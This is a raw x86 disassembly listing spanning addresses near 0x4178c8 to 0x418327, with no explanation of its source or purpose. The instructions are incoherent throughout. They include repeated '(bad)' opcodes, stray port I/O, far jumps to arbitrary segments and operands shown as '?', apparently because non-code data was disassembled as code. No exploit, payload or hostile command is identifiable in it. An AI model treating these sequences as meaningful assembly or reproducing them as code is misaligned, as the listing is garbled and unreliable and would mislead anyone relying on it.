  4178c8:	cmp    DWORD PTR [eax],0xfffffff2
  4178cb:	sub    cl,BYTE PTR [edi+0x2a]
  4178ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178cf:	push   ss
  4178d0:	add    eax,0xf3fa5ce6
  4178d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178d6:	mov    esi,0x9786fb88
  4178db:	in     eax,0xb4
  4178dd:	pop    ebx
  4178de:	push   ds
  4178df:	pop    esi
  4178e0:	jmp    0xb294:0x8a56d464
  4178e7:	add    WORD PTR [ecx-0x1cb48f24],0xff9b
  4178ef:	je     0x417896
  4178f1:	jmp    0x4178c5
  4178f3:	ret    0x75ca
  4178f6:	mov    eax,0x9493bbc9
  4178fb:	mov    eax,0x7d10357d
  417900:	in     eax,dx
  417901:	add    dl,BYTE PTR [ebp+ebp*2-0x605ffd2e]
  417908:	js     0x417961
  41790a:	pop    ds
  41790b:	mov    ah,0xb8
  41790d:	xor    DWORD PTR ds:0xa946,ebx
	...
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	sub    eax,0x9f24aa28
  417985:	stc    
  417986:	add    BYTE PTR [eax],al
  417988:	add    eax,0x29000001
  41798d:	mov    ds:0x31b657e7,eax
  417992:	push   cs
  417993:	test   BYTE PTR [eax-0x26],dl
  417996:	ret    0xdeae
  417999:	scas   eax,DWORD PTR es:[edi]
  41799a:	(bad)  
  41799b:	xor    DWORD PTR [edx-0x2a],esi
  41799e:	cmp    DWORD PTR [esi+0x4c],esp
  4179a1:	je     0x417a09
  4179a3:	jmp    0x4179cf
  4179a5:	addr16 pop edx
  4179a7:	xor    eax,DWORD PTR [edi-0x49]
  4179aa:	or     bp,WORD PTR [ebp+0x49]
  4179ae:	mov    ebp,0x385e199c
  4179b3:	sbb    eax,0x67373b16
  4179b8:	aam    0x5c
  4179ba:	shl    DWORD PTR [edx-0x3c],cl
  4179bd:	push   edx
  4179be:	aam    0xb9
  4179c0:	fcomp  QWORD PTR [ebp-0x5]
  4179c3:	loopne 0x417a2b
  4179c5:	adc    bh,BYTE PTR [eax-0x6c]
  4179c8:	enter  0x6adf,0x86
  4179cc:	in     eax,0x2
  4179ce:	sub    DWORD PTR [edi],ecx
  4179d0:	adc    eax,0x1ebe6187
  4179d5:	dec    DWORD PTR [eax-0x75]
  4179d8:	rcl    BYTE PTR [esi+0x57b4621d],cl
  4179de:	mov    WORD PTR [edi+0xe79a855],0x4129
  4179e7:	pop    esi
  4179e8:	(bad)  
  4179e9:	(bad)  
  4179ea:	mov    ebp,0xac1d455d
  4179ef:	call   0x75e2b0e1
  4179f4:	mov    ecx,0x9798b3cc
  4179f9:	out    0xba,al
  4179fb:	dec    esp
  4179fc:	int3   
  4179fd:	ins    DWORD PTR es:[edi],dx
  4179fe:	(bad)  [edx]
  417a00:	adc    al,0x90
  417a02:	add    eax,0x45b9022c
  417a07:	pop    edi
  417a08:	iret   
  417a09:	pop    edi
  417a0a:	shl    DWORD PTR [ebx-0x482ac765],1
  417a10:	(bad)  
  417a11:	push   ss
  417a12:	pop    ss
  417a13:	mov    DWORD PTR [edi+0x49],edi
  417a16:	dec    ecx
  417a17:	outs   dx,BYTE PTR ds:[esi]
  417a18:	hlt    
  417a19:	or     edi,edx
  417a1b:	and    DWORD PTR [ebp+eiz*1+0x49],edi
  417a1f:	add    eax,0x2d94832f
  417a24:	out    0xfc,eax
  417a26:	retf   0x76cc
  417a29:	inc    esp
  417a2a:	(bad)  
  417a2b:	fnstcw WORD PTR [ebx-0x23c0607d]
  417a31:	or     eax,0x3b288041
  417a36:	cmp    DWORD PTR [edi],esi
  417a38:	jbe    0x417aa9
  417a3a:	add    edx,DWORD PTR [ecx+0x2126748f]
  417a40:	jmp    FWORD PTR [ebp+0x7b]
  417a43:	or     BYTE PTR [ecx+0x32],bl
  417a46:	aaa    
  417a47:	sub    ch,BYTE PTR [edi+ecx*1-0x36]
  417a4b:	jecxz  0x417a41
  417a4d:	xor    eax,0xb375dcbd
  417a52:	and    eax,0x4a66fa96
  417a57:	setp   BYTE PTR [ebp+0x2e79eba6]
  417a5e:	jo     0x417a3e
  417a60:	inc    ebx
  417a61:	sbb    al,0x91
  417a63:	sub    al,0xf7
  417a65:	sbb    DWORD PTR [esi-0x58],0xffffffed
  417a69:	call   0x3b5ceaaf
  417a6e:	in     al,dx
  417a6f:	icebp  
  417a70:	fnstenv [ecx]
  417a72:	jl     0x417ab1
  417a74:	jnp    0x417a71
  417a76:	jg     0x417a2b
  417a78:	xchg   ebx,eax
  417a79:	adc    edi,edx
  417a7b:	aaa    
  417a7c:	pop    ecx
  417a7d:	in     eax,dx
  417a7e:	pop    es
  417a7f:	or     dh,BYTE PTR [esi-0x2102c12e]
  417a85:	outs   dx,BYTE PTR ds:[esi]
  417a86:	push   edx
  417a87:	push   edx
  417a88:	out    0xa7,al
  417a8a:	ret    0xfecb
  417a8d:	mov    al,BYTE PTR [ebx+0xb]
  417a90:	add    BYTE PTR [eax],0x0
	...
  417af3:	add    BYTE PTR [edi],ch
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x7e9ed460]
  417b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b05:	cli    
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    eax,0x98000001
  417b0d:	pushf  
  417b0e:	inc    ecx
  417b10:	mov    ah,0x84
  417b12:	std    
  417b13:	push   cs
  417b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b15:	sbb    BYTE PTR [esi],0xf4
  417b18:	sub    edi,DWORD PTR [ebx+0x34]
  417b1b:	out    dx,eax
  417b1c:	mov    ebp,0xae59bd4
  417b21:	jno    0x417b83
  417b23:	sbb    DWORD PTR [edx-0x5c59bbd3],ecx
  417b29:	push   eax
  417b2a:	arpl   WORD PTR [ebx],sp
  417b2c:	stos   BYTE PTR es:[edi],al
  417b2d:	push   0xf4e2cded
  417b32:	inc    edi
  417b33:	ins    DWORD PTR es:[edi],dx
  417b34:	popa   
  417b35:	mov    eax,0x3b2375b3
  417b3a:	pop    edi
  417b3b:	lods   al,BYTE PTR ds:[esi]
  417b3c:	mov    eax,es
  417b3e:	cpuid  
  417b40:	or     edi,DWORD PTR [esi]
  417b42:	(bad)  
  417b43:	scas   al,BYTE PTR es:[edi]
  417b44:	fldenv [ecx-0x3ccb0ff6]
  417b4a:	sub    cl,bh
  417b4c:	and    eax,edx
  417b4e:	add    eax,DWORD PTR [ebx+esi*4+0x9]
  417b52:	adc    eax,0xfe67a297
  417b57:	push   ecx
  417b58:	dec    ebx
  417b59:	bnd jmp 0x73ccb04b
  417b5f:	lods   eax,DWORD PTR ds:[esi]
  417b60:	sub    eax,0x5d0012d2
  417b65:	pop    edx
  417b66:	push   ebx
  417b67:	test   BYTE PTR [ecx],bh
  417b69:	test   BYTE PTR [eax+ebp*2+0xa6ba830],ah
  417b70:	jg     0x417b57
  417b72:	or     ebp,esp
  417b74:	jmp    0x417bbf
  417b76:	add    dl,ch
  417b78:	or     bh,dh
  417b7a:	int    0xfd
  417b7c:	adc    BYTE PTR [esi+0x0],0x45
  417b80:	outs   dx,BYTE PTR ds:[esi]
  417b81:	and    eax,0xee2047fc
  417b86:	loope  0x417b26
  417b88:	cs dec ebx
  417b8a:	sar    bl,0x2a
  417b8d:	mov    edx,0xdc1694c9
  417b92:	out    0x56,eax
  417b94:	dec    eax
  417b95:	xor    DWORD PTR [edx-0x13],eax
  417b98:	loopne 0x417c0e
  417b9a:	mov    eax,0xc1776009
  417b9f:	add    al,0xe9
  417ba1:	fadd   DWORD PTR [edi-0x12]
  417ba4:	mov    ah,0xf1
  417ba6:	mov    bl,0xb0
  417ba8:	mov    cl,0x97
  417baa:	mov    al,0x2c
  417bac:	cwde   
  417bad:	ins    BYTE PTR es:[edi],dx
  417bae:	icebp  
  417baf:	fdiv   QWORD PTR [ebx+0x69]
  417bb2:	adc    eax,0x9d6a7d4a
  417bb7:	jb     0x417bcf
  417bb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bba:	xor    eax,0x37064282
  417bbf:	pop    eax
  417bc0:	sbb    bh,BYTE PTR [ecx-0x1ff393b0]
  417bc6:	cmp    DWORD PTR [ebx-0x65],0xfffffff7
  417bca:	sbb    BYTE PTR [ebp-0x13f5dcb2],0xca
  417bd1:	or     cl,0xab
  417bd4:	xor    eax,0xb352aed7
  417bd9:	adc    dl,ah
  417bdb:	outs   dx,BYTE PTR ds:[esi]
  417bdc:	lds    esi,FWORD PTR [eax+0xb]
  417bdf:	mov    eax,0xe70399c6
  417be4:	out    0x45,al
  417be6:	sbb    ecx,DWORD PTR [edi+0x3e]
  417be9:	fld    st(6)
  417beb:	xor    BYTE PTR [ebx-0x4352abf],cl
  417bf1:	sub    eax,0x343dd70e
  417bf6:	lods   al,BYTE PTR ds:[esi]
  417bf7:	mov    ebp,0xf22e4c33
  417bfc:	mov    eax,ds:0xc4edae1f
  417c01:	xor    eax,0x31a5f024
  417c06:	popa   
  417c07:	fs jnp 0x417be0
  417c0a:	mov    al,ds:0xf87a030e
  417c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c10:	and    al,BYTE PTR [eax]
	...
  417c72:	add    BYTE PTR [eax],al
  417c74:	mov    eax,eax
  417c76:	nop
  417c77:	test   cl,bl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x58
  417c81:	pop    ss
  417c82:	stc    
  417c83:	retf   0xfba9
  417c86:	add    BYTE PTR [eax],al
  417c88:	add    eax,0x94000001
  417c8d:	adc    BYTE PTR [esp+edi*1+0x26],dl
  417c91:	mov    bh,0x45
  417c93:	jge    0x417c4c
  417c95:	xchg   esp,eax
  417c96:	shr    BYTE PTR [eax+edi*4],1
  417c99:	scas   al,BYTE PTR es:[edi]
  417c9a:	jmp    FWORD PTR [edi+ebp*8+0x5493b404]
  417ca1:	adc    esi,DWORD PTR ds:0x7d722490
  417ca7:	lahf   
  417ca8:	xchg   ebx,eax
  417ca9:	cs retf 
  417cab:	clc    
  417cac:	rol    esi,0xf6
  417caf:	in     eax,0xe3
  417cb1:	jmp    0x417cb0
  417cb3:	pop    esp
  417cb4:	out    0xa,al
  417cb6:	mov    ss,ecx
  417cb8:	rcl    DWORD PTR [edx+0x7b455205],1
  417cbe:	outs   dx,BYTE PTR ds:[esi]
  417cbf:	pop    edi
  417cc0:	scas   al,BYTE PTR es:[edi]
  417cc1:	jno    0x417d39
  417cc3:	inc    ebp
  417cc4:	std    
  417cc5:	ud2    
  417cc7:	mov    bh,0x95
  417cc9:	add    bh,bl
  417ccb:	pop    ebx
  417ccc:	in     al,dx
  417ccd:	inc    ebp
  417cce:	(bad)  
  417ccf:	mov    esp,0x314ac21a
  417cd4:	jae    0x417cfe
  417cd6:	pop    edx
  417cd7:	sub    al,bl
  417cd9:	sbb    ecx,esp
  417cdb:	jg     0x417c68
  417cdd:	cs pop eax
  417cdf:	xchg   edx,eax
  417ce0:	xor    BYTE PTR [ecx],ah
  417ce2:	push   esi
  417ce3:	jp     0x417c68
  417ce5:	cwde   
  417ce6:	dec    ecx
  417ce7:	test   DWORD PTR [edx-0x4e37453b],edi
  417ced:	loope  0x417cb0
  417cef:	and    al,0x32
  417cf1:	fsubp  st(1),st
  417cf3:	fstp   st(4)
  417cf5:	mov    ds:0x936b912d,eax
  417cfa:	add    bl,BYTE PTR [eax-0x6e]
  417cfd:	scas   al,BYTE PTR es:[edi]
  417cfe:	inc    edx
  417cff:	jle    0x417c95
  417d01:	and    BYTE PTR [ebx-0x5],bl
  417d04:	sub    BYTE PTR [ecx-0x5c98648c],dh
  417d0a:	or     dh,bl
  417d0c:	aas    
  417d0d:	jg     0x417cb4
  417d0f:	sahf   
  417d10:	lea    ecx,[ebp+edx*2+0x5bd2331c]
  417d17:	sub    edi,DWORD PTR [edi-0xa]
  417d1a:	pop    ecx
  417d1b:	loopne 0x417d2e
  417d1d:	mov    bl,0xf1
  417d1f:	xchg   ecx,eax
  417d20:	loopne 0x417d1a
  417d22:	enter  0x78dc,0x5b
  417d26:	adc    bh,BYTE PTR [ebx+0x18]
  417d29:	xchg   ecx,ecx
  417d2b:	inc    edi
  417d2c:	pusha  
  417d2d:	(bad)  [edi]
  417d2f:	and    BYTE PTR [edi],dl
  417d31:	mov    ch,0x26
  417d33:	and    dh,al
  417d35:	xor    eax,0xe2217295
  417d3a:	sbb    DWORD PTR [ebp+0x12ab6540],edx
  417d40:	pop    ecx
  417d41:	nop
  417d42:	mov    ecx,cs
  417d44:	xor    ebp,ebx
  417d46:	mov    al,ds:0x9c90340f
  417d4b:	xor    dl,BYTE PTR [ebp+edi*2+0xffec41d]
  417d52:	jo     0x417d46
  417d54:	pop    es
  417d55:	fsubr  st,st(1)
  417d57:	xchg   ecx,eax
  417d58:	test   BYTE PTR [eax-0x7ff69eb6],dh
  417d5e:	cli    
  417d5f:	js     0x417ced
  417d61:	int    0x2a
  417d63:	inc    esp
  417d64:	in     al,dx
  417d65:	xchg   BYTE PTR [ecx+0x50],bl
  417d68:	mov    WORD PTR ds:0x6059ae5,gs
  417d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d6f:	js     0x417da0
  417d71:	adc    cl,dh
  417d73:	push   0x43465886
  417d78:	aam    0xe2
  417d7a:	shr    ebp,0xa2
  417d7d:	jle    0x417d2a
  417d7f:	enter  0x9692,0x6d
  417d83:	int3   
  417d84:	imul   edx,esi,0xffffffec
  417d87:	sub    ah,BYTE PTR [ebx]
  417d89:	add    DWORD PTR [edx+0x77],edi
  417d8c:	jno    0x417d50
  417d8e:	mov    ebx,0xe3a4
	...
  417df3:	add    BYTE PTR [edi],dl
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	in     al,dx
  417e01:	mov    ebx,0xfcaecac8
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    eax,0xc000001
  417e0d:	fbld   TBYTE PTR [esi-0x3b]
  417e10:	pop    edi
  417e11:	xchg   edx,eax
  417e12:	(bad)  
  417e13:	lock push esi
  417e15:	rcl    DWORD PTR [edi],cl
  417e17:	es sti 
  417e19:	mov    cl,0x34
  417e1b:	push   esi
  417e1c:	ja     0x417e86
  417e1e:	gs jae 0x417e71
  417e21:	adc    ebp,ecx
  417e23:	ins    DWORD PTR es:[edi],dx
  417e24:	push   ss
  417e25:	pop    eax
  417e26:	xchg   edi,eax
  417e27:	fidivr DWORD PTR [edx+esi*4+0x5875d991]
  417e2e:	out    0x87,eax
  417e30:	repz jns 0x417dfb
  417e33:	shl    BYTE PTR [edi-0x4033c9cd],cl
  417e39:	lods   eax,DWORD PTR ds:[esi]
  417e3a:	pop    ebx
  417e3b:	mov    dl,0xb0
  417e3d:	mov    ?,ecx
  417e3f:	ret    0x3e41
  417e42:	popa   
  417e43:	ret    0xf78c
  417e46:	test   al,0x4
  417e48:	cli    
  417e49:	leave  
  417e4a:	dec    ecx
  417e4b:	into   
  417e4c:	repnz scas al,BYTE PTR es:[edi]
  417e4e:	mov    eax,ds:0x7942a6c4
  417e53:	cwde   
  417e54:	fidivr DWORD PTR [eax-0x6a994a7b]
  417e5a:	ret    
  417e5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e5c:	xchg   ecx,eax
  417e5d:	aam    0xd1
  417e5f:	ds sub esp,esi
  417e62:	sbb    dl,al
  417e64:	gs push esi
  417e66:	dec    esi
  417e67:	leave  
  417e68:	jno    0x417ed8
  417e6a:	push   ss
  417e6b:	push   eax
  417e6c:	push   ebx
  417e6d:	push   ebp
  417e6e:	xchg   BYTE PTR ds:0x6546a859,bl
  417e74:	adc    esp,edx
  417e76:	add    BYTE PTR [edx],ch
  417e78:	inc    edi
  417e79:	xor    eax,0x4cafb670
  417e7e:	call   0x4ea26699
  417e83:	push   es
  417e84:	in     eax,0x8f
  417e86:	imul   BYTE PTR [ebx+0x3958dd8c]
  417e8c:	call   0x57527c36
  417e91:	mov    bh,0x34
  417e93:	push   ebp
  417e94:	popf   
  417e95:	aam    0xf0
  417e97:	ror    BYTE PTR [ebx-0x2aa7bbf8],1
  417e9d:	xchg   DWORD PTR [eax],edi
  417e9f:	push   esi
  417ea0:	pop    eax
  417ea1:	clc    
  417ea2:	dec    edx
  417ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ea4:	cmc    
  417ea5:	jge    0x417f1e
  417ea7:	pop    ebp
  417ea8:	shr    BYTE PTR [edx],0x66
  417eab:	pop    edi
  417eac:	pop    ecx
  417ead:	xchg   edx,eax
  417eae:	daa    
  417eaf:	mov    esp,0x9f68a70a
  417eb4:	and    eax,0x75e55a4a
  417eb9:	mov    al,BYTE PTR [ecx-0x489737d5]
  417ebf:	sar    BYTE PTR [ecx],0x5f
  417ec2:	and    al,0x11
  417ec4:	xor    al,0x3b
  417ec6:	rol    DWORD PTR [edx],cl
  417ec8:	jmp    0x2905:0xf006b35b
  417ecf:	fs (bad) 
  417ed1:	fisubr WORD PTR [edi]
  417ed3:	pop    esi
  417ed4:	inc    BYTE PTR [ebx-0x5ef6d94f]
  417eda:	enter  0xe8b8,0xf4
  417ede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417edf:	inc    ebp
  417ee0:	jns    0x417ed5
  417ee2:	add    BYTE PTR [edi+ecx*1-0x3b2517c9],cl
  417ee9:	and    eax,edx
  417eeb:	adc    BYTE PTR [eax],0x2c
  417eee:	clc    
  417eef:	mov    ch,0xce
  417ef1:	xor    BYTE PTR [esi],ah
  417ef3:	mov    bh,0x8f
  417ef5:	xchg   esp,eax
  417ef6:	sub    BYTE PTR [edi-0x659f8a96],0xe2
  417efd:	in     eax,dx
  417efe:	cmp    al,dl
  417f00:	clc    
  417f01:	dec    esp
  417f02:	cmp    esi,DWORD PTR ds:0x27e51eb7
  417f08:	xchg   esi,eax
  417f09:	lock fstp DWORD PTR [edi+0x6799d068]
  417f10:	imul   eax,DWORD PTR [eax],0x0
	...
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	in     eax,0xd6
  417f82:	jecxz  0x417f35
  417f84:	mov    bl,0xfd
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    eax,0x97000001
  417f8d:	xchg   esi,eax
  417f8e:	icebp  
  417f8f:	loopne 0x418001
  417f91:	push   edi
  417f92:	sbb    eax,0x13921a8f
  417f97:	repz and eax,0xfa21273f
  417f9d:	sbb    DWORD PTR [ecx-0x1f],ecx
  417fa0:	pop    ecx
  417fa1:	lods   eax,DWORD PTR ds:[esi]
  417fa2:	xor    dh,cl
  417fa4:	fisub  DWORD PTR [ecx+0x5f]
  417fa7:	cmc    
  417fa8:	pop    ebx
  417fa9:	dec    ebx
  417faa:	mov    eax,DWORD PTR [eax-0x163c9c80]
  417fb0:	sub    DWORD PTR [ecx-0x70],0x7a
  417fb4:	repnz mov dh,0xe8
  417fb7:	xchg   edx,eax
  417fb8:	inc    ecx
  417fb9:	hlt    
  417fba:	mov    ah,0xb2
  417fbc:	aad    0x5
  417fbe:	push   esi
  417fbf:	int    0x53
  417fc1:	div    dl
  417fc3:	xor    DWORD PTR [edi+0x5d68096c],ebp
  417fc9:	shr    BYTE PTR [ebx+0x20c5c84b],cl
  417fcf:	and    BYTE PTR [esi+0x74c4ea],al
  417fd5:	in     al,0xf0
  417fd7:	xchg   esp,eax
  417fd8:	sbb    al,0x24
  417fda:	dec    edi
  417fdb:	push   esp
  417fdc:	add    edx,ecx
  417fde:	mov    dl,0x1e
  417fe0:	sbb    BYTE PTR [ebp-0x2b2b2257],al
  417fe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fe7:	sbb    eax,0x5c642f1e
  417fec:	mov    dh,0xed
  417fee:	into   
  417fef:	mov    edi,0x555685ec
  417ff4:	retf   
  417ff5:	inc    edi
  417ff6:	(bad)  
  417ff7:	push   esp
  417ff8:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  417ffa:	jne    0x417fa3
  417ffc:	cmp    dl,dh
  417ffe:	mov    cl,0xb9
  418000:	shr    BYTE PTR ds:0x304f663a,0xf5
  418007:	jne    0x418016
  418009:	or     edi,ecx
  41800b:	sbb    eax,0xcce97e9d
  418010:	scas   eax,DWORD PTR es:[edi]
  418011:	jmp    0x1609288d
  418016:	ret    
  418017:	cmp    eax,0x4583620
  41801c:	push   ds
  41801d:	jns    0x417fb6
  41801f:	loope  0x41808f
  418021:	in     al,dx
  418022:	int    0xac
  418024:	(bad)  
  418025:	fs pop esi
  418027:	adc    eax,0x9cd81a24
  41802c:	arpl   si,bp
  41802e:	test   BYTE PTR [esi+0x10],ah
  418031:	aas    
  418032:	iret   
  418033:	inc    esi
  418034:	add    ecx,ecx
  418036:	not    BYTE PTR [esi-0x31fee432]
  41803c:	pop    eax
  41803d:	dec    ebx
  41803e:	push   edx
  41803f:	repz mov esp,0xfe466c74
  418045:	sbb    DWORD PTR [esi],edx
  418047:	popa   
  418048:	inc    ebp
  418049:	in     al,0xae
  41804b:	xchg   DWORD PTR [eiz*4+0x147b543c],ebx
  418052:	adc    al,0xd4
  418054:	mov    cs,ecx
  418056:	add    eax,0x4b3e2fc9
  41805b:	mov    eax,ds:0xd4387322
  418060:	(bad)  
  418061:	push   ebp
  418062:	fisttp WORD PTR [eax+0x68f29b65]
  418068:	or     BYTE PTR [ebx],bh
  41806a:	mov    eax,0x75445dce
  41806f:	xchg   ecx,eax
  418070:	dec    eax
  418071:	adc    edx,DWORD PTR [esi+0x19]
  418074:	nop
  418075:	ret    
  418076:	pop    ebx
  418077:	xchg   DWORD PTR [esi],esp
  418079:	and    al,0x80
  41807b:	push   ds
  41807c:	ror    DWORD PTR [edi-0x4a],0x19
  418080:	aad    0x13
  418082:	leave  
  418083:	retf   
  418084:	retf   
  418085:	mov    DWORD PTR [edx],edx
  418087:	jl     0x4180a7
  418089:	mov    esp,DWORD PTR [eax-0x68]
  41808c:	stos   BYTE PTR es:[edi],al
  41808d:	pop    eax
  41808e:	arpl   WORD PTR [edx-0x6a],dx
	...
  4180f1:	add    BYTE PTR [eax],al
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x192fdebc,eax
  418101:	pop    esi
  418102:	sub    BYTE PTR [eax+edi*4],dh
  418105:	inc    BYTE PTR [eax]
  418107:	add    BYTE PTR ds:0xb4000001,al
  41810d:	mov    eax,ds:0x1920f651
  418112:	aad    0x4a
  418114:	xor    BYTE PTR [edi-0x57],dh
  418117:	mov    ah,0xa
  418119:	mov    ecx,0xd60269a3
  41811e:	ficom  WORD PTR [edx-0xe]
  418121:	retf   0x35e6
  418124:	sbb    dh,BYTE PTR [ebp+0x2e849044]
  41812a:	fidiv  DWORD PTR [edi+edi*1]
  41812d:	pushf  
  41812e:	dec    edx
  41812f:	inc    esp
  418130:	mov    ecx,0x79dd897c
  418135:	cmp    DWORD PTR ds:0xbfa58c26,ebx
  41813b:	sbb    edx,DWORD PTR [edx+ecx*1]
  41813e:	ss fs dec esi
  418141:	cmp    dl,BYTE PTR [edi+0x728230f9]
  418147:	jae    0x41815a
  418149:	or     bh,ah
  41814b:	or     DWORD PTR [edi-0x5fbb4178],esi
  418151:	js     0x418111
  418153:	popf   
  418154:	xchg   esp,eax
  418155:	or     eax,0x9c6ad59b
  41815a:	mov    esp,0xa478d03e
  41815f:	imul   eax,DWORD PTR [ebp-0x34],0xffffff8b
  418163:	test   esp,0xc9c03f60
  418169:	nop
  41816a:	das    
  41816b:	pop    esi
  41816c:	in     eax,0xb0
  41816e:	xchg   DWORD PTR [esi],ebx
  418170:	out    dx,al
  418171:	mov    dh,0x9a
  418173:	rol    BYTE PTR [ecx-0x5e],cl
  418176:	sbb    eax,0x47ef34f9
  41817b:	mov    edi,DWORD PTR [esi+0xd1ce61]
  418181:	and    al,0xeb
  418183:	sbb    al,0xd5
  418185:	sbb    esp,DWORD PTR [ebp-0x72]
  418188:	pop    es
  418189:	dec    ebx
  41818a:	cmp    al,0xbd
  41818c:	jmp    0x5afd4b0a
  418191:	mov    al,ds:0x7c491e63
  418196:	sti    
  418197:	iret   
  418198:	jns    0x418124
  41819a:	push   es
  41819b:	imul   ebp,DWORD PTR [ecx],0xfffffff3
  41819e:	adc    dh,BYTE PTR fs:[edx-0x65b03d3b]
  4181a5:	and    DWORD PTR [edi+ebp*1+0x7abda149],0x81d67a3b
  4181b0:	arpl   WORD PTR [eax+0x67480d87],bx
  4181b6:	add    eax,0x94fa1e4d
  4181bb:	aad    0x68
  4181bd:	clc    
  4181be:	das    
  4181bf:	adc    dl,BYTE PTR [edi+esi*8-0x4e]
  4181c3:	loope  0x41815a
  4181c5:	(bad)  
  4181c6:	int3   
  4181c7:	push   ds
  4181c8:	push   ss
  4181c9:	ins    BYTE PTR es:[edi],dx
  4181ca:	adc    al,0x32
  4181cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181cd:	jb     0x418152
  4181cf:	lods   al,BYTE PTR ds:[esi]
  4181d0:	dec    edi
  4181d1:	adc    ch,cl
  4181d3:	mov    cl,BYTE PTR [eax-0x3a0d77c0]
  4181d9:	int3   
  4181da:	shl    BYTE PTR [esi+0xf79d283],1
  4181e0:	cs mov dh,0x6a
  4181e3:	add    eax,0xc77ee114
  4181e8:	sub    BYTE PTR [ebp+0x3f],0x78
  4181ec:	jne    0x418266
  4181ee:	call   0x3bc4:0xb52c1f37
  4181f5:	sub    edx,esp
  4181f7:	mov    ebx,0x374de101
  4181fc:	pop    edi
  4181fd:	outs   dx,DWORD PTR ds:[esi]
  4181fe:	call   0x12199fb5
  418203:	xchg   ebx,eax
  418204:	mov    eax,0xf7ae3ed4
  418209:	leave  
  41820a:	jns    0x4181bc
  41820c:	add    al,0x42
  41820e:	jecxz  0x4181ce
  418210:	inc    esp
	...
  418271:	add    BYTE PTR [eax],al
  418273:	add    BYTE PTR [edi],dh
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0xe8e3b8d6
  418282:	dec    edx
  418283:	(bad)  
  418284:	mov    ebp,0x50000ff
  418289:	add    DWORD PTR [eax],eax
  41828b:	add    BYTE PTR ds:0x68679235,dh
  418291:	pop    edi
  418292:	dec    eax
  418293:	cwde   
  418294:	into   
  418295:	push   0xd6a7453
  41829a:	mov    edx,0x8991fd98
  41829f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182a0:	(bad)  
  4182a1:	jns    0x418292
  4182a3:	add    al,0xa0
  4182a5:	push   ecx
  4182a6:	aam    0x97
  4182a8:	dec    edx
  4182a9:	mov    ah,0xa7
  4182ab:	ins    DWORD PTR es:[edi],dx
  4182ac:	sbb    cl,BYTE PTR [ebx]
  4182ae:	mov    bh,0x1f
  4182b0:	jmp    0x418266
  4182b2:	outs   dx,BYTE PTR ds:[esi]
  4182b3:	mov    al,bl
  4182b5:	fild   QWORD PTR [ecx]
  4182b7:	mov    bh,0x64
  4182b9:	mov    BYTE PTR [eax+0x54855237],cl
  4182bf:	and    esi,DWORD PTR [eax]
  4182c1:	or     cl,dl
  4182c3:	xchg   DWORD PTR [eax+0x8ecd46b],ecx
  4182c9:	daa    
  4182ca:	mov    ah,0xc8
  4182cc:	mov    eax,ds:0xd668e076
  4182d1:	pop    esi
  4182d2:	and    edi,esi
  4182d4:	aam    0x28
  4182d6:	loopne 0x418318
  4182d8:	pusha  
  4182d9:	push   esi
  4182da:	dec    ebp
  4182db:	xchg   DWORD PTR [edx+0x3],ebp
  4182de:	popa   
  4182df:	loop   0x4182cc
  4182e1:	ficom  WORD PTR [ebx]
  4182e3:	mov    ?,WORD PTR [eax+eax*2]
  4182e6:	pop    ss
  4182e7:	and    esp,edi
  4182e9:	adc    dl,BYTE PTR [edi]
  4182eb:	xchg   ecx,eax
  4182ec:	or     BYTE PTR [ebx-0x19],0x63
  4182f0:	clc    
  4182f1:	mov    ds:0x88b37049,eax
  4182f6:	ja     0x4182a6
  4182f8:	mov    al,ds:0x59ec7a0
  4182fd:	daa    
  4182fe:	sbb    DWORD PTR [ebp-0x334c9d03],ecx
  418304:	fidivr DWORD PTR [ebx]
  418306:	push   esp
  418307:	ja     0x418334
  418309:	or     eax,0xfd97f9ef
  41830e:	ds scas eax,DWORD PTR es:[edi]
  418310:	sub    BYTE PTR cs:[edi-0x33fde3ef],ch
  418317:	xor    bl,BYTE PTR [ecx-0x504f9803]
  41831d:	mov    edx,?
  41831f:	mov    bl,0xa1
  418321:	ins    DWORD PTR es:[edi],dx
  418322:	jl     0x4182bc
  418324:	mov    eax,edi
  418326:	dec    eax
  418327:	push   0x5b1ea839
